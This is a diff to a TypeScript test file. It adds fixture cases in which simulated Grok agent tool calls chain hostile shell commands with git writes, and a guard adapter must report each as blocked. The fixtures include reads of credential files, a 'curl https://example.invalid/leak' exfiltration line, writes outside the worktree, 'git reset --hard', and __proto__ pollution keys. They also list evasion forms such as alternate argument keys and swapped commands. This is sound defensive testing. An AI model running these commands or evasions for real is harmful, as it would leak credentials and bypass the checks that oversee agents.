@@ -18,17 +18,20 @@
  * - trailing tool calls after the `end` line in `tool_call` and `tool_call_update` forms (T4.23 fail-closed);
  * - late and swapped commands in `tool_call_update`;
  * - runs with no `end` line at exit 0 and exit 1;
- * - hostile calls followed by provider `error` lines (model unavailable, auth, rate limit);
- * - stream anomalies (session id changed mid-run, second `end` line, unknown events before the hostile call);
+ * - hostile calls followed by provider `error` lines (model unavailable, auth, rate limit) across all categories at exit 0 and exit 1;
+ * - stream anomalies (session id changed mid-run, multiple `end` lines, unknown events before the hostile call,
+ *   unsafe session IDs, structured model and backing-provider fields, own `__proto__` key beside command) at exit 0 and exit 1;
  * - varied Git write syntax (`git commit -am`, `git -C . push --force`, `git update-ref`, `git branch -D`, and the
  *   forms live check step 9 showed a prefix deny does not stop: `git -C . commit`, `/usr/bin/git commit`,
- *   `sh -c 'git ...'`, plus `env git push`, `xargs git push`, `git --git-dir=.git commit` and `git reset --hard`);
+ *   `sh -c 'git ...'`, plus `env git push`, `xargs git push`, `git --git-dir=.git commit`, `git reset --hard`,
+ *   `git merge`, `git rebase`, `git pull`, `git cherry-pick`, `git checkout -b`, and `git revert`);
  * - alternative argument keys (`parameters`, `args`, `arguments`, `command`, `cmd`, `CommandLine`), including
- *   `input.cmd` and a top-level `command`, on `tool_call` and `tool_call_update`, and shell identity via `name` and
+ *   `input.cmd`, `parameters.CommandLine`, `args.CommandLine`, `arguments.cmd`, top-level `command`, and omitted
+ *   tool name defaulting to `run_terminal_command`, on `tool_call` and `tool_call_update`, and shell identity via `name` and
  *   `tool_name`;
  * - a hostile command that arrives only on `tool_call_update`, and a swap correlated by `id`, `call_id` or
  *   `tool_call_id`;
- * - prototype-named, near-miss, non-string and live-bare `tool_call` lines (row 4b) in `unknown_events`.
+ * - prototype-named, near-miss, non-string, unreadable text/end and live-bare `tool_call` lines in `unknown_events`.
  *
  * Field names other than `type` are still hypothetical: the live check did not record command or target fields.
  * Partial streams cut inside a line are exported as `grokPartialStreams` and replayed separately.
@@ -787,7 +790,7 @@ const grokCase: AdapterLegCase = {
     },
 
     // -------------------------------------------------------------------------
-    // 8. Runs that terminate without an `end` line at exit 0 (fail closed)
+    // 8. Runs that terminate without an `end` line at exit 0 and exit 1 (fail closed)
     // -------------------------------------------------------------------------
     {
       name: "completed shell read of a credential path with no end line",
@@ -802,12 +805,36 @@ const grokCase: AdapterLegCase = {
       ],
     },
     {
+      name: "completed shell read of a credential path with no end line, exit 1",
+      category: "credential_read",
+      exitCode: 1,
+      failureCode: "PERMISSION_BLOCKED",
+      lines: [
+        META("completed shell read of a credential path with no end line, exit 1", 1),
+        TOOLS,
+        toolCall(`cat ${fx.codexAuthPath} && git push origin main`),
+        sandboxDenied(`cat ${fx.codexAuthPath} && git push origin main`),
+      ],
+    },
+    {
       name: "completed shell write outside the worktree with no end line",
       category: "out_of_worktree_write",
       exitCode: 0,
       failureCode: "PERMISSION_BLOCKED",
       lines: [
         META("completed shell write outside the worktree with no end line", 0),
+        TOOLS,
+        toolCall(`touch ${fx.outsideSentinel} && git push origin main`),
+        sandboxDenied(`touch ${fx.outsideSentinel} && git push origin main`),
+      ],
+    },
+    {
+      name: "completed shell write outside the worktree with no end line, exit 1",
+      category: "out_of_worktree_write",
+      exitCode: 1,
+      failureCode: "PERMISSION_BLOCKED",
+      lines: [
+        META("completed shell write outside the worktree with no end line, exit 1", 1),
         TOOLS,
         toolCall(`touch ${fx.outsideSentinel} && git push origin main`),
         sandboxDenied(`touch ${fx.outsideSentinel} && git push origin main`),
@@ -825,10 +852,35 @@ const grokCase: AdapterLegCase = {
         sandboxDenied("curl https://example.invalid/leak && git push origin main"),
       ],
     },
+    {
+      name: "completed shell network call with no end line, exit 1",
+      category: "network",
+      exitCode: 1,
+      failureCode: "PERMISSION_BLOCKED",
+      lines: [
+        META("completed shell network call with no end line, exit 1", 1),
+        TOOLS,
+        toolCall("curl https://example.invalid/leak && git push origin main"),
+        sandboxDenied("curl https://example.invalid/leak && git push origin main"),
+      ],
+    },
 
     // -------------------------------------------------------------------------
     // 9. Hostile call followed by a provider `error` line (guard outranks provider error)
     // -------------------------------------------------------------------------
+    {
+      name: "shell read of a credential path, then a provider model error",
+      category: "credential_read",
+      exitCode: 0,
+      failureCode: "PERMISSION_BLOCKED",
+      lines: [
+        META("shell read of a credential path, then a provider model error", 0),
+        TOOLS,
+        toolCall(`cat ${fx.claudeCredentialsPath} && git push origin main`),
+        MODEL_ERROR,
+        end(),
+      ],
+    },
     {
       name: "shell read of a credential path, then a provider model error, exit 1",
       category: "credential_read",
@@ -839,6 +891,94 @@ const grokCase: AdapterLegCase = {
         TOOLS,
         toolCall(`cat ${fx.codexAuthPath} && git push origin main`),
         MODEL_ERROR,
+      ],
+    },
+    {
+      name: "shell read of a credential path, then a provider auth error",
+      category: "credential_read",
+      exitCode: 0,
+      failureCode: "PERMISSION_BLOCKED",
+      lines: [
+        META("shell read of a credential path, then a provider auth error", 0),
+        TOOLS,
+        toolCall(`cat ${fx.claudeCredentialsPath} && git push origin main`),
+        AUTH_ERROR,
+        end(),
+      ],
+    },
+    {
+      name: "shell read of a credential path, then a provider auth error, exit 1",
+      category: "credential_read",
+      exitCode: 1,
+      failureCode: "PERMISSION_BLOCKED",
+      lines: [
+        META("shell read of a credential path, then a provider auth error, exit 1", 1),
+        TOOLS,
+        toolCall(`cat ${fx.codexAuthPath} && git push origin main`),
+        AUTH_ERROR,
+      ],
+    },
+    {
+      name: "shell read of a credential path, then a provider rate limit error",
+      category: "credential_read",
+      exitCode: 0,
+      failureCode: "PERMISSION_BLOCKED",
+      lines: [
+        META("shell read of a credential path, then a provider rate limit error", 0),
+        TOOLS,
+        toolCall(`cat ${fx.claudeCredentialsPath} && git push origin main`),
+        RATE_LIMIT_ERROR,
+        end(),
+      ],
+    },
+    {
+      name: "shell read of a credential path, then a provider rate limit error, exit 1",
+      category: "credential_read",
+      exitCode: 1,
+      failureCode: "PERMISSION_BLOCKED",
+      lines: [
+        META("shell read of a credential path, then a provider rate limit error, exit 1", 1),
+        TOOLS,
+        toolCall(`cat ${fx.codexAuthPath} && git push origin main`),
+        RATE_LIMIT_ERROR,
+      ],
+    },
+    {
+      name: "shell write outside the worktree, then a provider model error",
+      category: "out_of_worktree_write",
+      exitCode: 0,
+      failureCode: "PERMISSION_BLOCKED",
+      lines: [
+        META("shell write outside the worktree, then a provider model error", 0),
+        TOOLS,
+        toolCall(`touch ${fx.outsideSentinel} && git push origin main`),
+        MODEL_ERROR,
+        end(),
+      ],
+    },
+    {
+      name: "shell write outside the worktree, then a provider model error, exit 1",
+      category: "out_of_worktree_write",
+      exitCode: 1,
+      failureCode: "PERMISSION_BLOCKED",
+      lines: [
+        META("shell write outside the worktree, then a provider model error, exit 1", 1),
+        TOOLS,
+        toolCall(`touch ${fx.outsideSentinel} && git push origin main`),
+        MODEL_ERROR,
+      ],
+    },
+    {
+      name: "shell write outside the worktree, then a provider auth error",
+      category: "out_of_worktree_write",
+      exitCode: 0,
+      failureCode: "PERMISSION_BLOCKED",
+      lines: [
+        META("shell write outside the worktree, then a provider auth error", 0),
+        TOOLS,
+        toolCall(`touch ${fx.outsideSentinel} && git push origin main`),
+        AUTH_ERROR,
+        end(),
       ],
     },
     {
@@ -854,14 +994,27 @@ const grokCase: AdapterLegCase = {
       ],
     },
     {
-      name: "shell network call, then a provider rate limit error, exit 1",
-      category: "network",
+      name: "shell write outside the worktree, then a provider rate limit error",
+      category: "out_of_worktree_write",
+      exitCode: 0,
+      failureCode: "PERMISSION_BLOCKED",
+      lines: [
+        META("shell write outside the worktree, then a provider rate limit error", 0),
+        TOOLS,
+        toolCall(`touch ${fx.outsideSentinel} && git push origin main`),
+        RATE_LIMIT_ERROR,
+        end(),
+      ],
+    },
+    {
+      name: "shell write outside the worktree, then a provider rate limit error, exit 1",
+      category: "out_of_worktree_write",
       exitCode: 1,
       failureCode: "PERMISSION_BLOCKED",
       lines: [
-        META("shell network call, then a provider rate limit error, exit 1", 1),
+        META("shell write outside the worktree, then a provider rate limit error, exit 1", 1),
         TOOLS,
-        toolCall("curl https://example.invalid/leak && git push origin main"),
+        toolCall(`touch ${fx.outsideSentinel} && git push origin main`),
         RATE_LIMIT_ERROR,
       ],
     },
@@ -875,35 +1028,69 @@ const grokCase: AdapterLegCase = {
         TOOLS,
         toolCall("curl https://example.invalid/leak && git push origin main"),
         MODEL_ERROR,
+        end(),
       ],
     },
     {
-      // Exit 0 was missing for a credential read followed by an auth error. The guard still outranks AUTH_REQUIRED.
-      name: "shell read of a credential path, then a provider auth error",
-      category: "credential_read",
+      name: "shell network call, then a provider model error, exit 1",
+      category: "network",
+      exitCode: 1,
+      failureCode: "PERMISSION_BLOCKED",
+      lines: [
+        META("shell network call, then a provider model error, exit 1", 1),
+        TOOLS,
+        toolCall("curl https://example.invalid/leak && git push origin main"),
+        MODEL_ERROR,
+      ],
+    },
+    {
+      name: "shell network call, then a provider auth error",
+      category: "network",
       exitCode: 0,
       failureCode: "PERMISSION_BLOCKED",
       lines: [
-        META("shell read of a credential path, then a provider auth error", 0),
+        META("shell network call, then a provider auth error", 0),
         TOOLS,
-        toolCall(`cat ${fx.claudeCredentialsPath} && git push origin main`),
+        toolCall("curl https://example.invalid/leak && git push origin main"),
         AUTH_ERROR,
         end(),
       ],
     },
     {
-      // Exit 0 was missing for an out-of-worktree write followed by a rate-limit error. The message is not a
-      // recorded rate-limit shape, so without the Git write it would be TOOL_FAILURE, never RATE_LIMIT_TRANSIENT.
-      name: "shell write outside the worktree, then a provider rate limit error",
-      category: "out_of_worktree_write",
+      name: "shell network call, then a provider auth error, exit 1",
+      category: "network",
+      exitCode: 1,
+      failureCode: "PERMISSION_BLOCKED",
+      lines: [
+        META("shell network call, then a provider auth error, exit 1", 1),
+        TOOLS,
+        toolCall("curl https://example.invalid/leak && git push origin main"),
+        AUTH_ERROR,
+      ],
+    },
+    {
+      name: "shell network call, then a provider rate limit error",
+      category: "network",
       exitCode: 0,
       failureCode: "PERMISSION_BLOCKED",
       lines: [
-        META("shell write outside the worktree, then a provider rate limit error", 0),
+        META("shell network call, then a provider rate limit error", 0),
         TOOLS,
-        toolCall(`touch ${fx.outsideSentinel} && git push origin main`),
+        toolCall("curl https://example.invalid/leak && git push origin main"),
         RATE_LIMIT_ERROR,
         end(),
+      ],
+    },
+    {
+      name: "shell network call, then a provider rate limit error, exit 1",
+      category: "network",
+      exitCode: 1,
+      failureCode: "PERMISSION_BLOCKED",
+      lines: [
+        META("shell network call, then a provider rate limit error, exit 1", 1),
+        TOOLS,
+        toolCall("curl https://example.invalid/leak && git push origin main"),
+        RATE_LIMIT_ERROR,
       ],
     },
 
@@ -923,6 +1110,18 @@ const grokCase: AdapterLegCase = {
       ],
     },
     {
+      name: "shell write outside the worktree under a changed session id, exit 1",
+      category: "out_of_worktree_write",
+      exitCode: 1,
+      failureCode: "PERMISSION_BLOCKED",
+      lines: [
+        META("shell write outside the worktree under a changed session id, exit 1", 1),
+        TOOLS,
+        toolCall(`touch ${fx.outsideSentinel} && git push origin main`),
+        end("end_turn", OTHER_SID),
+      ],
+    },
+    {
       name: "shell read of a credential path, then multiple end lines",
       category: "credential_read",
       exitCode: 0,
@@ -931,6 +1130,19 @@ const grokCase: AdapterLegCase = {
         META("shell read of a credential path, then multiple end lines", 0),
         TOOLS,
         toolCall(`cat ${fx.claudeCredentialsPath} && git push origin main`),
+        end(),
+        end(),
+      ],
+    },
+    {
+      name: "shell read of a credential path, then multiple end lines, exit 1",
+      category: "credential_read",
+      exitCode: 1,
+      failureCode: "PERMISSION_BLOCKED",
+      lines: [
+        META("shell read of a credential path, then multiple end lines, exit 1", 1),
+        TOOLS,
+        toolCall(`cat ${fx.codexAuthPath} && git push origin main`),
         end(),
         end(),
       ],
@@ -946,6 +1158,101 @@ const grokCase: AdapterLegCase = {
         JSON.stringify({ type: "synthetic_unknown_kind", sessionId: SID }),
         toolCall("curl https://example.invalid/leak && git push origin main"),
         end(),
+      ],
+    },
+    {
+      name: "unknown event kinds, then a shell network call, exit 1",
+      category: "network",
+      exitCode: 1,
+      failureCode: "PERMISSION_BLOCKED",
+      lines: [
+        META("unknown event kinds, then a shell network call, exit 1", 1),
+        TOOLS,
+        JSON.stringify({ type: "synthetic_unknown_kind", sessionId: SID }),
+        toolCall("curl https://example.invalid/leak && git push origin main"),
+      ],
+    },
+    {
+      name: "shell read of a credential path under an unsafe session id",
+      category: "credential_read",
+      exitCode: 0,
+      failureCode: "PERMISSION_BLOCKED",
+      lines: [
+        META("shell read of a credential path under an unsafe session id", 0),
+        TOOLS,
+        toolCall(`cat ${fx.claudeCredentialsPath} && git push origin main`),
+        end("end_turn", "--unsafe-id"),
+      ],
+    },
+    {
+      name: "shell write outside the worktree under an unsafe session id, exit 1",
+      category: "out_of_worktree_write",
+      exitCode: 1,
+      failureCode: "PERMISSION_BLOCKED",
+      lines: [
+        META("shell write outside the worktree under an unsafe session id, exit 1", 1),
+        TOOLS,
+        toolCall(`touch ${fx.outsideSentinel} && git push origin main`),
+        end("end_turn", "--unsafe-id"),
+      ],
+    },
+    {
+      name: "shell network call with structured model and backing_provider",
+      category: "network",
+      exitCode: 0,
+      failureCode: "PERMISSION_BLOCKED",
+      lines: [
+        META("shell network call with structured model and backing_provider", 0),
+        TOOLS,
+        toolCall("curl https://example.invalid/leak && git push origin main"),
+        JSON.stringify({
+          type: "end",
+          stopReason: "end_turn",
+          sessionId: SID,
+          model: "grok-4.7-build",
+          backing_provider: "xai",
+        }),
+      ],
+    },
+    {
+      name: "shell read of a credential path with structured model and backingProvider, exit 1",
+      category: "credential_read",
+      exitCode: 1,
+      failureCode: "PERMISSION_BLOCKED",
+      lines: [
+        META("shell read of a credential path with structured model and backingProvider, exit 1", 1),
+        TOOLS,
+        toolCall(`cat ${fx.codexAuthPath} && git push origin main`),
+        JSON.stringify({
+          type: "end",
+          stopReason: "end_turn",
+          sessionId: SID,
+          model: "grok-4.7-build",
+          backingProvider: "xai",
+        }),
+      ],
+    },
+    {
+      name: "shell write outside the worktree with own __proto__ key beside command",
+      category: "out_of_worktree_write",
+      exitCode: 0,
+      failureCode: "PERMISSION_BLOCKED",
+      lines: [
+        META("shell write outside the worktree with own __proto__ key beside command", 0),
+        TOOLS,
+        `{"type":"tool_call","tool":"run_terminal_command","input":{"__proto__":{"poison":true},"command":"touch ${fx.outsideSentinel} && git push origin main"}}`,
+        end(),
+      ],
+    },
+    {
+      name: "shell network call with own __proto__ key beside command, exit 1",
+      category: "network",
+      exitCode: 1,
+      failureCode: "PERMISSION_BLOCKED",
+      lines: [
+        META("shell network call with own __proto__ key beside command, exit 1", 1),
+        TOOLS,
+        `{"type":"tool_call","tool":"run_terminal_command","input":{"__proto__":{"poison":true},"command":"curl https://example.invalid/leak && git push origin main"}}`,
       ],
     },
 
@@ -1242,6 +1549,166 @@ const grokCase: AdapterLegCase = {
         toolCall("curl https://example.invalid/leak && git --git-dir=.git commit --allow-empty -m x"),
       ],
     },
+    {
+      name: "shell read of a credential path chained with git merge",
+      category: "credential_read",
+      exitCode: 0,
+      failureCode: "PERMISSION_BLOCKED",
+      lines: [
+        META("shell read of a credential path chained with git merge", 0),
+        TOOLS,
+        toolCall(`cat ${fx.claudeCredentialsPath} && git merge origin/feature`),
+        end(),
+      ],
+    },
+    {
+      name: "shell write outside the worktree chained with git rebase, exit 1",
+      category: "out_of_worktree_write",
+      exitCode: 1,
+      failureCode: "PERMISSION_BLOCKED",
+      lines: [
+        META("shell write outside the worktree chained with git rebase, exit 1", 1),
+        TOOLS,
+        toolCall(`touch ${fx.outsideSentinel} && git rebase origin/main`),
+      ],
+    },
+    {
+      name: "shell network call chained with git pull",
+      category: "network",
+      exitCode: 0,
+      failureCode: "PERMISSION_BLOCKED",
+      lines: [
+        META("shell network call chained with git pull", 0),
+        TOOLS,
+        toolCall("curl https://example.invalid/leak && git pull origin main"),
+        end(),
+      ],
+    },
+    {
+      name: "shell read of a credential path chained with git cherry-pick, exit 1",
+      category: "credential_read",
+      exitCode: 1,
+      failureCode: "PERMISSION_BLOCKED",
+      lines: [
+        META("shell read of a credential path chained with git cherry-pick, exit 1", 1),
+        TOOLS,
+        toolCall(`cat ${fx.codexAuthPath} && git cherry-pick abc1234`),
+      ],
+    },
+    {
+      name: "shell write outside the worktree chained with git checkout -b",
+      category: "out_of_worktree_write",
+      exitCode: 0,
+      failureCode: "PERMISSION_BLOCKED",
+      lines: [
+        META("shell write outside the worktree chained with git checkout -b", 0),
+        TOOLS,
+        toolCall(`touch ${fx.outsideSentinel} && git checkout -b hostile-branch`),
+        end(),
+      ],
+    },
+    {
+      name: "shell network call chained with git revert, exit 1",
+      category: "network",
+      exitCode: 1,
+      failureCode: "PERMISSION_BLOCKED",
+      lines: [
+        META("shell network call chained with git revert, exit 1", 1),
+        TOOLS,
+        toolCall("curl https://example.invalid/leak && git revert HEAD"),
+      ],
+    },
+    {
+      name: "tool_call input.cmd carrying git push",
+      category: "credential_read",
+      exitCode: 0,
+      failureCode: "PERMISSION_BLOCKED",
+      lines: [
+        META("tool_call input.cmd carrying git push", 0),
+        TOOLS,
+        JSON.stringify({
+          type: "tool_call",
+          tool: "run_terminal_command",
+          input: { cmd: `cat ${fx.claudeCredentialsPath} && git push origin main` },
+        }),
+        end(),
+      ],
+    },
+    {
+      name: "tool_call parameters.CommandLine carrying git commit, exit 1",
+      category: "out_of_worktree_write",
+      exitCode: 1,
+      failureCode: "PERMISSION_BLOCKED",
+      lines: [
+        META("tool_call parameters.CommandLine carrying git commit, exit 1", 1),
+        TOOLS,
+        JSON.stringify({
+          type: "tool_call",
+          tool: "run_terminal_command",
+          parameters: { CommandLine: `touch ${fx.outsideSentinel} && git commit --allow-empty -m x` },
+        }),
+      ],
+    },
+    {
+      name: "tool_call args.CommandLine carrying git push",
+      category: "network",
+      exitCode: 0,
+      failureCode: "PERMISSION_BLOCKED",
+      lines: [
+        META("tool_call args.CommandLine carrying git push", 0),
+        TOOLS,
+        JSON.stringify({
+          type: "tool_call",
+          tool: "run_terminal_command",
+          args: { CommandLine: "curl https://example.invalid/leak && git push origin main" },
+        }),
+        end(),
+      ],
+    },
+    {
+      name: "tool_call arguments.cmd carrying git reset, exit 1",
+      category: "credential_read",
+      exitCode: 1,
+      failureCode: "PERMISSION_BLOCKED",
+      lines: [
+        META("tool_call arguments.cmd carrying git reset, exit 1", 1),
+        TOOLS,
+        JSON.stringify({
+          type: "tool_call",
+          tool: "run_terminal_command",
+          arguments: { cmd: `cat ${fx.codexAuthPath} && git reset --hard HEAD` },
+        }),
+      ],
+    },
+    {
+      name: "tool_call without tool name carrying git commit",
+      category: "out_of_worktree_write",
+      exitCode: 0,
+      failureCode: "PERMISSION_BLOCKED",
+      lines: [
+        META("tool_call without tool name carrying git commit", 0),
+        TOOLS,
+        JSON.stringify({
+          type: "tool_call",
+          input: { command: `touch ${fx.outsideSentinel} && git commit --allow-empty -m x` },
+        }),
+        end(),
+      ],
+    },
+    {
+      name: "tool_call without tool name carrying git push, exit 1",
+      category: "network",
+      exitCode: 1,
+      failureCode: "PERMISSION_BLOCKED",
+      lines: [
+        META("tool_call without tool name carrying git push, exit 1", 1),
+        TOOLS,
+        JSON.stringify({
+          type: "tool_call",
+          input: { command: "curl https://example.invalid/leak && git push origin main" },
+        }),
+      ],
+    },
 
     // -------------------------------------------------------------------------
     // 13. Unknown event kinds category
@@ -1326,6 +1793,32 @@ const grokCase: AdapterLegCase = {
         META("Bare and unreadable tool lines; the adapter must report them unknown.", 1),
         JSON.stringify({ type: "tool_call" }),
         `{"type":"tool_call","arguments":{"__proto__":{"command":"git push origin main"}}}`,
+        JSON.stringify({ type: "tool_call_update" }),
+      ],
+    },
+    {
+      name: "unreadable text and end lines, clean exit",
+      category: "unknown_events",
+      exitCode: 0,
+      failureCode: "OUTPUT_PROTOCOL_ERROR",
+      lines: [
+        META("Unreadable text and end shapes without required fields; adapter must report them unknown.", 0),
+        JSON.stringify({ type: "text" }),
+        JSON.stringify({ type: "text", data: 42 }),
+        JSON.stringify({ type: "end" }),
+        JSON.stringify({ type: "end", stopReason: false }),
+        JSON.stringify({ type: "tool_call_update" }),
+      ],
+    },
+    {
+      name: "unreadable text, end and bare tool_call_update, exit 1",
+      category: "unknown_events",
+      exitCode: 1,
+      failureCode: "TOOL_FAILURE",
+      lines: [
+        META("Unreadable text and end shapes without required fields at exit 1.", 1),
+        JSON.stringify({ type: "text", data: { not: "a string" } }),
+        JSON.stringify({ type: "end", stopReason: 123 }),
         JSON.stringify({ type: "tool_call_update" }),
       ],
     },
